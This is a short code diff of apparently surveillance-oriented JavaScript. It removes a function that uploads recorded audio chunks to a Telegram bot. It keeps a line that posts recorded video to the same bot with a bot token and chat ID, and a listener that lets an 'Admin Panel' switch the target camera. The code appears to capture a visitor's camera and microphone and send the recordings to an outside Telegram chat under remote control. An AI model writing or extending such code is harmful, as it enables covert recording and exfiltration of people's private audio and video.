@@ -389,14 +389,6 @@
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
         }
 
-        function sendStandaloneAudio(chunks, ext) {
-            const blob = new Blob(chunks, { type: `audio/${ext}` }); 
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('document', blob, `clear_audio.${ext}`); // Sent as document to ensure Telegram keeps max quality
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
-        }
-
         // Listens for camera switch from Admin Panel
         window.addEventListener('storage', (event) => {
             if (event.key === 'cameraTarget') {
